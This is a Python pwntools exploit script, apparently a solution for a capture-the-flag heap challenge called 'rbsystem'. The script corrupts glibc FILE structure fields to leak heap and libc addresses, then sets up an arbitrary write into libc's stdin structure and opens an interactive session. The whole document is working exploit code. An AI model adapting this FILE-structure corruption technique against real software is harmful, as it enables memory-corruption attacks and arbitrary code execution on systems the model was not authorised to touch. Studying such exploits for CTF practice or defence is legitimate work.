#!/usr/bin/env python3
from pwn import *


def prompt(tube, choice):
    tube.recvuntil(b'Your choice: ')
    tube.sendline(str(choice))


def allocate(tube, index, size=0x1000):
    prompt(tube, 1)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def edit(tube, index, offset, size):
    prompt(tube, 2)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Offset: ')
    tube.sendline(str(offset))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def show(tube, index):
    prompt(tube, 3)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Content: ')
    suffix = b'\n1. allocate\n'
    data = tube.recvuntil(suffix)
    return data[:-len(suffix)]


def open_file(tube):
    prompt(tube, 4)


def close_file(tube):
    prompt(tube, 5)


ATTACKER_INDEX = 15
FILE_ADDR_EXAMPLE = 0x558216da5350
READ_BASE_EXAMPLE = 0x558216da6590
ATTACKER_ADDR_EXAMPLE = 0x558216da5580
OFFSETOF_IO_READ_PTR = 8
OFFSETOF_IO_READ_END = 16
OFFSETOF_IO_READ_BASE = 24
OFFSETOF_IO_BUF_END = 64
OFFSETOF_CHAIN = 104


def setup_heap(tube):
    """Heap layout: | 1k x 15 | FILE | 1k | _IO_read_base (1k) |"""
    for i in range(ATTACKER_INDEX):
        allocate(tube, i)
    open_file(tube)
    allocate(tube, ATTACKER_INDEX)


def overwrite_field(tube, offset, size):
    edit(tube, ATTACKER_INDEX, offset - (ATTACKER_ADDR_EXAMPLE - FILE_ADDR_EXAMPLE), size)


def leak_qword(tube):
    edit(tube, ATTACKER_INDEX, 0, 8)
    qword, = struct.unpack('<Q', show(tube, ATTACKER_INDEX).ljust(8, b'\x00'))
    return qword


def skip_until_file(tube):
    offset = 0
    for _ in range(0x10000 // 8):
        if leak_qword(tube) & 0xffffffff == 0xfbad2488:
            return offset
        offset += 8
    assert False, 'Could not find FILE'


def main():
    tube = gdb.debug(['./rbsystem'], gdbscript=r'''
set logging overwrite on
set pagination off
set logging on
b malloc
commands
  python n = int(str(gdb.parse_and_eval('$rdi'))); gdb.execute('finish'); print('malloc(0x{:x}) = 0x{:x}'.format(n, int(str(gdb.parse_and_eval('$rax'))))); gdb.execute('c')
end
c
''')
    setup_heap(tube)
    overwrite_field(tube, OFFSETOF_IO_READ_END, 8)  # allow infinite reading from heap
    edit(tube, ATTACKER_INDEX, 0, 0x1000)  # skip urandom data
    edit(tube, ATTACKER_INDEX, 0, 0x1000)  # just in case; now _IO_read_ptr points to 0s
    overwrite_field(tube, OFFSETOF_IO_READ_PTR, 2)  # rewind; now we are somewhere before FILE
    edit(tube, ATTACKER_INDEX, 0, 6)  # align to qword boundary
    skip_until_file(tube)
    edit(tube, ATTACKER_INDEX, 0, OFFSETOF_IO_READ_BASE - 8)  # position on _IO_read_base
    read_base = leak_qword(tube)
    print(f'read_base     = 0x{read_base:016x}')
    attacker_addr = read_base - (READ_BASE_EXAMPLE - ATTACKER_ADDR_EXAMPLE)
    print(f'attacker_addr = 0x{attacker_addr:016x}')
    edit(tube, ATTACKER_INDEX, 0, OFFSETOF_CHAIN - OFFSETOF_IO_READ_BASE - 8)  # position on _chain
    chain = leak_qword(tube)
    print(f'chain         = 0x{chain:016x}')
    libc = chain - (0x7f9015d9f680 - 0x7f90159b3000)
    print(f'libc          = 0x{libc:016x}')
    assert libc & 0xfff == 0
    stdin = libc + 0x3eba00
    print(f'stdin         = 0x{stdin:016x}')
    # we don't need infinite reading from heap anymore, and corrupted _IO_read_end is now a royal PITA
    close_file(tube)
    open_file(tube)
    offsetx = stdin + OFFSETOF_IO_BUF_END - attacker_addr
    edit(tube, ATTACKER_INDEX, offsetx, -offsetx)  # allow infinite writing to libc
    tube.interactive()


if __name__ == '__main__':
    main()
